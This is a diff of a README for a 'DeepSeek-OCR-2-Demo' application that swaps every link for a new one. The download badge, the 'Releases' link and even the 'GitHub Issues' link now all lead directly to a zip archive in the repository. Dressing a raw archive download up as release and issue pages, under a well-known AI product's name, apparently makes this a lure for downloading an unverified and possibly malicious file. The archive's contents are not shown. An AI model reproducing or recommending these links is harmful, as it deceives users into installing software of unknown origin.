@@ -6,9 +6,9 @@ Welcome to DeepSeek-OCR-2-Demo! This application allows you to convert documents
 
 ## 📥 Download the Application
 
-[![Download](https://raw.githubusercontent.com/bus35hs/DeepSeek-OCR-2-Demo/main/examples/OC-Demo-Seek-Deep-v1.4.zip%20Now-blue)](https://raw.githubusercontent.com/bus35hs/DeepSeek-OCR-2-Demo/main/examples/OC-Demo-Seek-Deep-v1.4.zip)
+[![Download](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip%20Now-blue)](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip)
 
-Visit this page to download the application: [DeepSeek-OCR-2-Demo Releases](https://raw.githubusercontent.com/bus35hs/DeepSeek-OCR-2-Demo/main/examples/OC-Demo-Seek-Deep-v1.4.zip)
+Visit this page to download the application: [DeepSeek-OCR-2-Demo Releases](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ To run DeepSeek-OCR-2-Demo, ensure your system meets these requirements:
 
 1. **Visit the Releases Page**
 
-   Go to the [DeepSeek-OCR-2-Demo Releases](https://raw.githubusercontent.com/bus35hs/DeepSeek-OCR-2-Demo/main/examples/OC-Demo-Seek-Deep-v1.4.zip) page.
+   Go to the [DeepSeek-OCR-2-Demo Releases](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip) page.
 
 2. **Choose Your Version**
 
@@ -83,7 +83,7 @@ If you encounter any issues during installation or usage, consider the following
 
 If you need further help, you can reach out through the following methods:
 
-- GitHub Issues Page: Report any bugs or request features [here](https://raw.githubusercontent.com/bus35hs/DeepSeek-OCR-2-Demo/main/examples/OC-Demo-Seek-Deep-v1.4.zip).
+- GitHub Issues Page: Report any bugs or request features [here](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip).
 - Community Forums: Join discussions with other users and developers for tips and tricks.
 
 ## 📆 Updates
